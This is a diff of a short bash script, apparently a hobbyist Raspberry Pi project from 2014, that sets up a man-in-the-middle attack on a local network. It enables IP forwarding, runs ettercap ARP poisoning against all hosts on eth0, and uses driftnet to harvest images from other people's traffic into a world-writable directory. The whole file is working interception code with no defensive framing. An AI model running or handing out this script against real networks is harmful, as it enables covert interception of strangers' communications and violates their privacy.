@@ -1,11 +1,16 @@
+
 #!/bin/bash
-echo "$(tput bold)$(tput setaf 1)MITM initialize / enable port forwarding & make directory for files$(tput sgr0)"
-sudo mkdir /mnt/localImages # create directory on mount HDD. me no like flash drive write cycles :'(
+echo "$(tput bold)$(tput setaf 1)MITM initialize & enable port forwarding & make directory for files$(tput sgr0)"
+# create directory to save images on external HDD on Pi because
+# me no like SD card limitied write cycles :'(
+sudo mkdir /mnt/localImages
 gif=$(find /mnt/localImages/ -type f -name "*.gif")
-sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for arp poisoning
+sudo chmod -R a+rwx /mnt/localImages # enable all read/write/execute permissions for to HDD
+sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for ARP poisoning
+cd /mnt/localImages/ #enter directory of images
 sudo ettercap -T -Q -M arp -i eth0 // // &
-echo "$(tput bold)$(tput setaf 1)extract images -x myImages & save$(tput sgr0)"
-sudo driftnet -v -i eth0 -a -m 100 -d localImages & # save 100 images
+echo "$(tput bold)$(tput setaf 1)extract images & save$(tput sgr0)"
+sudo driftnet -v -i eth0 -a -m 100 -d /mnt/localImages -x myImages & # save 100 images
 while :
 do
 if [[ ( -n $gif ) ]]
@@ -14,5 +19,5 @@ then
         sudo rm /mnt/localImages/*.gif
 fi
 done
-# end program
-# Daniel Jay Bertner 2014
+#end program
+#Daniel Jay Bertner 2014
